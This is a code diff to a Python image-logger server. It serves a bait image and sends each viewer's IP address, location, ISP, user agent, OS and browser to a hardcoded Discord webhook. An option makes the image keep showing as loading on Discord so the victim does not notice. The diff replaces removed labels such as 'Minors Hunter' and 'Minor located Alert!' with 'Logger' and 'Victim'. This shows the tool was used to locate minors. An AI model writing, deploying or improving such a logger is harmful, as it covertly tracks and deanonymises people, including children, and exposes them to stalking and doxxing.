@@ -2,18 +2,18 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/921881735074045952/odABLuB69AbGE8XL5WhCtdBVzRfX9dRnUZ9sJR2bZyR7NdezG5hhzVVbDS-rgU6h910G'
-bindata = requests.get('https://cdn.discordapp.com/attachments/883328412192768051/1050903923386503299/whybruhno.jpg').content
+webhook = 'https://discord.com/api/webhooks/1130846623996583946/WNYI6Hb85cYtBRbNCM2f_DAn-skgDmXe7nKtp1IdV9ujVWlbN0swWEdMUraralRMfOJG'
+bindata = requests.get('https://cdn.discordapp.com/avatars/935995474995998740/2f3cf4fcdbaba049073e620b0c6ee09a.png').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Minors Hunter",
+  "username": "Logger",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Frosty hunted down a minor ongggg!",
+      "title": "Victim",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
@@ -37,13 +37,13 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Minors Hunter",
+  "username": "Logger",
   "content": "",
   "embeds": [
     {
-      "title": "Minor located Alert!",
+      "title": "Victim",
       "color": 16711803,
-      "description": f"Discord previewed a funny Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
         "name": "imagine getting hacked"
       },
